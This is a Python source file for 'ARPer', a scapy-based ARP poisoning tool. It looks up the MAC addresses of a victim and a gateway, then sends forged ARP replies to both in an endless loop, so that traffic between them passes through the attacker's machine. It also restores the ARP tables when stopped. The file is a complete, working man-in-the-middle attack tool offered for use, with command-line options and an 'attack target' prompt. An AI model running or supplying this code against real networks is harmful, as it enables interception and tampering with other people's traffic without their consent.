from scapy.all import (ARP, Ether, conf, send, srp)
from termcolor import colored
import argparse
import sys
import time
import logging

RESET = "\033[0m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"

def banner():
    print("\n")

    print(colored(r"  ___  ____________         ", "blue"))
    print(colored(r" / _ \ | ___ \ ___ \        ", "blue"))
    print(colored(r"/ /_\ \| |_/ / |_/ /__ _ __ ", "blue"))
    print(colored(r"|  _  ||    /|  __/ _ \ '__|", "blue"))
    print(colored(r"| | | || |\ \| | |  __/ |   ", "blue"))
    print(colored(r"\_| |_/\_| \_\_|  \___|_|   ", "blue"))
    print(f"{YELLOW}             ______         {RESET}")
    print(f"{YELLOW}            |______|        {RESET}")

    print("\n\n")

def help():
    print(f"""
{RED}ARPer - ARP poisoning tool / by ENDOGGI{RESET}

{YELLOW}warning:{RESET}
    {GREEN}requires ROOT privileges
    requires port forwarding enabled
        (sudo echo 1 >> /proc/sys/net/ipv4/ip_forward){RESET}
              
{YELLOW}options:{RESET}
    {GREEN}-t{RESET}, --target      Target IP address
    {GREEN}-g{RESET}, --gateway     Gateway IP address
    {GREEN}-i{RESET}, --interface   Network interface (e.g., eth0)
    {GREEN}-h{RESET}, --help        show this menu
              
{YELLOW}example:{RESET}
    {GREEN}sudo python3 arper.py -t 192.168.1.69 -g 192.168.1.1 -i eth0{RESET}
              """)

def get_mac(target_ip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=1, pdst=target_ip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None

class Arper:
    def __init__(self, victim, gateway, interface='eth0'):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0

        print(f'{GREEN}[*]{RESET} initialized interface {YELLOW}{interface}{RESET}:')
        print(f'Gateway {YELLOW}({gateway}){RESET} has MAC address {YELLOW}{self.gatewaymac}{RESET}.')
        print(f'Victim {YELLOW}({victim}){RESET} has MAC address {YELLOW}{self.victimmac}{RESET}.\n')
        

    def poison(self):
        print('-' * 30)
        conf.iface = self.interface

        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac

        print(f'Source IP address: {poison_victim.psrc}')
        print(f'Destination IP address: {poison_victim.pdst}')
        print("\n")
        print(f'Source MAC address: {poison_victim.hwsrc}')
        print(f'Destination MAC address: {poison_victim.hwdst}')
        print(colored(poison_victim.summary(), "yellow"))
        print('-' * 30)

        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac

        print(f'Source IP address: {poison_gateway.psrc}')
        print(f'Destination IP address: {poison_gateway.pdst}')
        print("\n")
        print(f'Source MAC address: {poison_gateway.hwsrc}')
        print(f'Destination MAC address: {poison_gateway.hwdst}')
        print(colored(poison_gateway.summary(), "yellow"))
        print('-' * 30)

        print(f'Starting ARP poisoning (press {RED}ctrl-C{RESET} to stop)')
        try:
            while True:
                sys.stdout.write('.')
                sys.stdout.flush()
                send(poison_victim, verbose=False)
                send(poison_gateway, verbose=False)
                time.sleep(1)
        except KeyboardInterrupt:
            print(f'\n\n{RED}[!]{RESET} Interrupted detected. Restoring ARP tables...')
            self.restore()

    def restore(self):
        print('Restoring ARP tables...')
        send(ARP(
            op=2,
            psrc=self.gateway,
            hwsrc=self.gatewaymac,
            pdst=self.victim,
            hwdst=('ff:ff:ff:ff:ff:ff'),
            ), count=5)
        
        send(ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victimmac,
            pdst=self.gateway,
            hwdst=('ff:ff:ff:ff:ff:ff'),
            ), count=5)
     
        print(f'\n{GREEN}Done{RESET}')
        sys.exit()

if __name__=='__main__':

    banner()

    parser = argparse.ArgumentParser(usage="%(prog)s -t TARGET -g GATEWAY -i INTERFACE [-h]", add_help=False)

    parser.add_argument("-t", "--target", help="attack target")
    parser.add_argument("-g", "--gateway", help="gateway")
    parser.add_argument("-i", "--interface", help="interface")
    parser.add_argument("-h", "--help",action="store_true", help="show help")

    args = parser.parse_args()

    if args.help or len(sys.argv) == 1:
        help()
        sys.exit(0)
    
    if not args.target or not args.gateway or not args.interface:
        print(f"{RED}[ERROR] {YELLOW}required arguments -t, -g, -i")
        print(f"use -h to see help{RESET}")
        sys.exit(1)

    (victim, gateway, interface) = args.target, args.gateway, args.interface

    logging.getLogger("scapy.runtime").setLevel(logging.CRITICAL)

    arp = Arper(victim, gateway, interface)

    confirm = input(f"start the attack? {GREEN}y{RESET}/{RED}n{RESET}: ")
    if confirm.lower() != "y":
        exit(f"{RED}cancelled")

    arp.poison()
